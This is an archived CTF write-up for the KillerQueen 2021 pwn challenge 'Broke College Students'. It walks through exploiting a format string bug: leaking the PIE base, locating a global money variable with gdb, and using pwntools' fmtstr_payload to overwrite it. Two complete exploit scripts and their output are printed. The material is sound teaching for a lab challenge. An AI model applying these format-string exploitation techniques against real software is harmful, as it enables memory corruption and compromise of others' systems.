# Broke_College_Students

**CTF:** KillerQueen 2021  
**Category:** pwn  
**Original writeup:** <https://ctf.rip/write-ups/pwn/killerqueen-pwns/> — by **ctf.rip**. All credit goes to the original author; this is an archived copy.

---

Broke College Students - Pwn - 309 points

This challenge reads:

The lengths that some people go to in order to pay for college (nc 143.198.184.186 5001) 72 solves

This one comes again with a single file:

brokecollegestudents

This again is an ELF 64bit binary, but this time with every protection enabled:

$ file brokecollegestudents brokecollegestudents: ELF 64-bit LSB pie executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1] = fe875e00832ddcdd136fa7ad9946379f24bcfd3d, for GNU/Linux 3.2.0, not stripped $ checksec brokecollegestudents [ * ] 'brokecollegestudents' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled

With PIE being enabled we know we’re certainly going to need a leak to do anything meaningful. Playing around with the binary I could formulate an idea of what we need to do:

$ ./brokecollegestudents Welcome to the College Applications! What would you like to do ? You have 5000 money. =========================== 1 ) Scholarship Application Portal 2 ) Collegeboard Website 3 ) Quit =========================== Choice: 1 Welcome to the College Applications! Would you like to delve into scholarship hunting? It 's only $500 and you have a one in a million chance of winning. What a steal! =========================== You have 5000 money. 1) Yes ($500) 2) No =========================== Choose: 1 You encountered some kind of wild application essay reader thing! What do you want to do? 1) Apply! 2) Run away and follow your dreams of art school! CHOOSE: 1 YOU GOT IT! You caught a wild scholarship! These are rare. What is it' s name? name: AAAA Maybe now you 'll be able to afford a single quarter of university! The scholarship you got was: AAAAWhat would you like to do? You have 4500 money. =========================== 1) Scholarship Application Portal 2) Collegeboard Website 3) Quit =========================== Choice: 2 Welcome to the Collegeboard website! You have 4500 money. 1) Send a SINGLE AP Test Score ($1000000) 2) Buy FLAG ($9999999) BUY ITEM (0 to cancel): 2 Hmm doesn' t look like you have enough money for that...What would you like to do ? You have 4500 money. =========================== 1 ) Scholarship Application Portal 2 ) Collegeboard Website 3 ) Quit =========================== Choice: 3 Maybe we 'll just all settle for trade school

Looks like maybe we need to find an arbitrary read/write primative and change our Money to be enough to buy the flag. Let’s take a look in Ghidra…

Firstly there’s a lot of things going on in this binary but eventually it leads to this bug in catch() where if we catch a scholarship we get to name it. There’s a format string bug here. This gives us the basics of a read/write primative.

void catch ( void ) { long in_FS_OFFSET ; char fmtStringBug [ 24 ]; long local_10 ; local_10 = * ( long * )( in_FS_OFFSET + 0x28 ); puts ( "You caught a wild scholarship! These are rare." ); puts ( "What is it \' s name?" ); printf ( "name: " ); fflush ( stdout ); __isoc99_scanf ( & DAT_00102349 , fmtStringBug ); puts ( "Maybe now you \' ll be able to afford a single quarter of university! The scholarship you got was:

" ); printf ( fmtStringBug ); fflush ( stdout ); if ( local_10 != * ( long * )( in_FS_OFFSET + 0x28 )) { /* WARNING: Subroutine does not return */ __stack_chk_fail (); } return ; }

Since PIE is on, the approach I want to take is:

Leak the base address. Calculate where in memory MONEY is stored relative to the base address. Format string write a bunch of money there. Buy the flag.

After using a similar technique we used in Tweetybirb, I find a good and stable pointer as the 23rd argument on the stack:

$ ./brokecollegestudents Welcome to the College Applications! What would you like to do ? You have 5000 money. =========================== 1 ) Scholarship Application Portal 2 ) Collegeboard Website 3 ) Quit =========================== Choice: 1 Welcome to the College Applications! Would you like to delve into scholarship hunting? It 's only $500 and you have a one in a million chance of winning. What a steal! =========================== You have 5000 money. 1) Yes ($500) 2) No =========================== Choose: 1 You encountered some kind of wild application essay reader thing! What do you want to do? 1) Apply! 2) Run away and follow your dreams of art school! CHOOSE: 1 YOU GOT IT! You caught a wild scholarship! These are rare. What is it' s name? name: %23 $016llx Maybe now you 'll be able to afford a single quarter of university! The scholarship you got was: 0000556adb57992d

After I get that address I can find out the base address of the binary and check the offset:

$ cat /proc/ $( pidof brokecollegestudents ) /maps 556adb578000-556adb579000 r--p 00000000 08:01 1051727 brokecollegestudents ...

So we know the base address is 0x556adb578000 and the leaked pointer is 0x556adb57992d . Quick math: 0x556adb57992d - 0x556adb578000 6445 . I ran the binary multiple times and this %23$016llx pointer always ended up being 6445 bytes away from the binary base address. So now we know how to locate our PIE base address.

Next we want to know where in memory is money stored? To do this I attached a debugger to the process and looked at the display_money() function.

$ gdb -p $( pidof brokecollegestudents ) gdb-peda $ disass display_money Dump of assembler code for function display_money: 0x0000556adb579393 <+0>: endbr64 0x0000556adb579397 <+4>: push rbp 0x0000556adb579398 <+5>: mov rbp,rsp 0x0000556adb57939b <+8>: mov eax,DWORD PTR [ rip+0x2c7b] # 0x556adb57c01c <MONEY> 0x0000556adb5793a1 <+14>: mov esi,eax 0x0000556adb5793a3 <+16>: lea rdi,[rip+0xca7] # 0x556adb57a051 0x0000556adb5793aa <+23>: mov eax,0x0 0x0000556adb5793af <+28>: call 0x556adb579110 < printf @plt>

There it is, MONEY is at 0x556adb57c01c . That is 0x556adb57c01c - 0x556adb578000 = 16412 away from the base address. I checked a few times and its always there so we have a reliable way to locate our money.

Next we need to overwrite money. Pwntool’s helps here, this is the first exploit I tried:

from pwn import * host , port = "143.198.184.186" , 5001 local = True binary = context . binary = ELF ( './brokecollegestudents' ) if local : p = process ( './brokecollegestudents' ) else : p = remote ( host , port ) ptrbaseoffset = 6445 # base is 6445 less than the leaked pointer moneyoffset = 16412 # money offset is baseaddr+16412 # leak a pointer and calculate base address and money address p . recvuntil ( b'Choice: ' ) p . sendline ( b'1' ) p . recvlines ( 8 ) p . sendline ( b'1' ) p . recvuntil ( b'CHOOSE: ' ) p . sendline ( b'1' ) p . recvuntil ( b'name: ' ) p . sendline ( b'%23$016llx' ) p . recvlines ( 2 ) leak = p . recvline (). decode ()[ 0 : 16 ] # Calculate base and money addresses. base = int ( leak , 16 ) - 6445 money = base + moneyoffset log . info ( 'leaked base address: %x' % base ) log . info ( 'money location: %x' % money ) # write a bunch of money # our fmt string is 6th on the stack write = { money : 10000000 } payload = fmtstr_payload ( 6 , write ) p . recvuntil ( b'Choice: ' ) p . sendline ( b'1' ) p . recvlines ( 8 ) p . sendline ( b'1' ) p . recvuntil ( b'CHOOSE: ' ) p . sendline ( b'1' ) p . recvuntil ( b'name: ' ) p . sendline ( payload ) p . recvlines ( 3 ) balance = p . recvline (). decode (). split ()[ 2 ] log . success ( "Money balance now: %s" % balance ) log . info ( "Now go on a shopping spree!!" ) p . interactive ()

Unfortunately there is no way this can work. Writing such a large value causes the stack canary to bust us:

$ python exp.py [ * ] 'brokecollegestudents' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [ +] Starting local process './brokecollegestudents' : pid 877737 [ * ] leaked base address: 55a3e93b4000 [ * ] money location: 55a3e93b801c Traceback ( most recent call last ) : File "exp.py" , line 52, in <module> balance = p.recvline () .decode () .split ()[ 2] File "/usr/local/lib/python3.9/dist-packages/pwnlib/tubes/tube.py" , line 490, in recvline return self.recvuntil ( self.newline, drop = not keepends, timeout = timeout ) File "/usr/local/lib/python3.9/dist-packages/pwnlib/tubes/tube.py" , line 333, in recvuntil res = self.recv ( timeout = self.timeout ) File "/usr/local/lib/python3.9/dist-packages/pwnlib/tubes/tube.py" , line 105, in recv return self._recv ( numb, timeout ) or b '' File "/usr/local/lib/python3.9/dist-packages/pwnlib/tubes/tube.py" , line 183, in _recv if not self.buffer and not self._fillbuffer ( timeout ) : File "/usr/local/lib/python3.9/dist-packages/pwnlib/tubes/tube.py" , line 154, in _fillbuffer data = self.recv_raw ( self.buffer.get_fill_size ()) File "/usr/local/lib/python3.9/dist-packages/pwnlib/tubes/process.py" , line 727, in recv_raw raise EOFError EOFError [ * ] Process './brokecollegestudents' stopped with exit code -6 ( SIGABRT ) ( pid 877737 )

SIGABRT means we tripped the stack canary protection.

Then I had the idea, instead of writing the entire $10,000,000 we need to buy the flag, lets just write 1 byte into a significant enough position to increase our money. The next exploit looked like this:

from pwn import * host , port = "143.198.184.186" , 5001 local = False binary = context . binary = ELF ( './brokecollegestudents' ) if local : p = process ( './brokecollegestudents' ) else : p = remote ( host , port ) ptrbaseoffset = 6445 # base is 6445 less than the leaked pointer moneyoffset = 16412 # money offset is baseaddr+16412 # leak a pointer and calculate base address and money address p . recvuntil ( b'Choice: ' ) p . sendline ( b'1' ) p . recvlines ( 8 ) p . sendline ( b'1' ) p . recvuntil ( b'CHOOSE: ' ) p . sendline ( b'1' ) p . recvuntil ( b'name: ' ) p . sendline ( b'%23$016llx' ) p . recvlines ( 2 ) leak = p . recvline (). decode ()[ 0 : 16 ] base = int ( leak , 16 ) - 6445 money = base + moneyoffset log . info ( 'leaked base address: %x' % base ) log . info ( 'money location: %x' % money ) # write a bunch of money # our fmt string is 6th on the stack write = { money + 3 : 0x10 } payload = fmtstr_payload ( 6 , write ) p . recvuntil ( b'Choice: ' ) p . sendline ( b'1' ) p . recvlines ( 8 ) p . sendline ( b'1' ) p . recvuntil ( b'CHOOSE: ' ) p . sendline ( b'1' ) p . recvuntil ( b'name: ' ) p . sendline ( payload ) p . recvlines ( 3 ) balance = p . recvline (). decode (). split ()[ 2 ] log . success ( "Money balance now: %s" % balance ) log . info ( "Now go on a shopping spree!!" ) p . interactive ()

And this time it was muich smoother:

$ python exp.py [ * ] 'brokecollegestudents' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [ +] Opening connection to 143.198.184.186 on port 5001: Done [ * ] leaked base address: 559a913a3000 [ * ] money location: 559a913a701c [ +] Money balance now: 268439456 [ * ] Now go on a shopping spree!! [ * ] Switching to interactive mode =========================== 1 ) Scholarship Application Portal 2 ) Collegeboard Website 3 ) Quit =========================== Choice: $ 2 Welcome to the Collegeboard website! You have 268439456 money. 1 ) Send a SINGLE AP Test Score ( $1000000 ) 2 ) Buy FLAG ( $9999999 ) $ 2 BUY ITEM ( 0 to cancel ) : kqctf { did_you_resort_to_selling_NFTs_for_college_money_???? }
